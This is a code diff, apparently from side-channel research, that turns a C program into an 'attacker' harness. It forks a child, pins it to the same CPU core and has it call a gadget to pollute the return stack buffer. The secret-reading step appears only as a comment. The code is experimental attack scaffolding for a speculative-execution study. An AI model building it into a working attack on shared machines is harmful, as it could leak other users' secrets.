@@ -58,12 +58,52 @@ void gadget() {
 }
 
 int main(int argc, char *argv[]){
-	if (argc > 1) {
-		printf("doing nothing\n");
-		while(1) {}
+	printf("Attacker Launching...\n");
+
+	// start child process
+	pid_t pid = fork();
+	// loads the entire array
+
+	if(pid == 0){
+		auto cpu = sched_getcpu();
+		printf("RSB pollution on core: %d\n", cpu);
+		// child process
+		// doing nothing, just for comparison
+		if ((argc == 2)&&(argv[1][0]=='0')) {
+			printf("Doing nothing...\n");
+			while(1) {}
+			return 0;
+		}
+		// polluter start polluting RSB
+		else if((argc == 2)&&(argv[1][0]=='1')){
+			printf("Polluting RSB...\n");
+			gadget();
+			return 0;
+		}
+		else{
+			printf("Invalid argument\n");
+			return -1;
+		}
+
 	}
-	printf("polluting rsb\n");
-	gadget();
+	else if(pid > 0){
+		auto cpu = sched_getcpu();
+		printf("Attacker launched on core: %d\n", cpu);
+		cpu_set_t  mask;
+		CPU_ZERO(&mask);
+		CPU_SET(cpu, &mask);
+		auto result = sched_setaffinity(pid, sizeof(mask), &mask);
+		// parent process;
+		sleep(1);
+		//access time to the array;
+		kill(pid, SIGKILL);
+		// printf("secret found\n");
+		return 0;
+	}
+	else{
+		printf("fork error\n");
+		return -1;
+	}
 
 	// string buffer;
 	// char temp;
